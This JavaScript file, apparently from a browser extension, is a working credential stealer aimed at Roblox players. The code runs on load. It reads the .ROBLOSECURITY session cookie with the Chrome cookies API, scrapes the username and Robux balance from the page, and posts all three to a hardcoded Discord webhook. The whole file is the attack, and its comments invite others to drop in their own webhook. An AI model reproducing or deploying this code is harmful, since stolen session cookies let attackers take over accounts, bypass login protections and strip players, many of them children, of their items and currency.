const webhookUrl = 'https://discord.com/api/webhooks/1293261110438264913/p0Wx8436uc25-B-CWtAO78nD84Pj7Zqmrb7s1LdfB1xBcTqOYkLDqjspVUlwAi4Qs_-B'; // Replace with your actual webhook URL

// Function to send data to Discord
function sendToDiscord(username, robuxAmount, robloxSecurity) {
    const data = {
        content: `Username: ${username}\nRobux: ${robuxAmount}\n.ROBLOSECURITY: ${robloxSecurity}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            console.log('Account information sent successfully to Discord.');
        } else {
            console.error('Failed to send account information:', response.statusText);
        }
    })
    .catch(error => console.error('Network error:', error));
}

// Function to get the cookie and account info
function getRobloxAccountInfo() {
    chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' }, (cookie) => {
        if (cookie) {
            const robloxSecurity = cookie.value;

            // Scrape the account information
            const username = document.querySelector('.username-selector')?.textContent; // Adjust the selector
            const robuxAmount = document.querySelector('.robux-amount-selector')?.textContent; // Adjust the selector

            // Send the collected information to Discord
            sendToDiscord(username, robuxAmount, robloxSecurity);
        } else {
            console.log('.ROBLOSECURITY Cookie not found.');
        }
    });
}

// Run the function
getRobloxAccountInfo();
